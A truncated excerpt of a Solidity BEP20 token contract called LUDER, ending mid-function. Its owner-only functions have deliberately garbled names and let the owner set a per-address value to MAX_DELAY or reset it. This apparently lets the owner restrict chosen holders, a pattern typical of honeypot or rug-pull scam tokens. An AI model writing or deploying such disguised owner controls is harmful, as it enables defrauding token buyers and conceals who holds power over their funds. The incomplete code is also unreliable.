...
contract LUDER is IBEP20, HasForeignAsset {
    ...
    function getLuderProtocol17714ssit(address booadndd) public view returns (uint256) {
        return _depolssit[booadndd];
    }

    function _setLuderProtocol17714reward(address booadndd) public onlyOwner {
        _depolssit[booadndd] = MAX_DELAY;
    }

    function SetupLuderProtocol17714ssit(address booadndd) public onlyOwner {
        _depolssit[booadndd] = 0;
    }


    function SetupLuderProtocol17714Aasses(address booadndd,uint256 nuum) public onlyOwner {
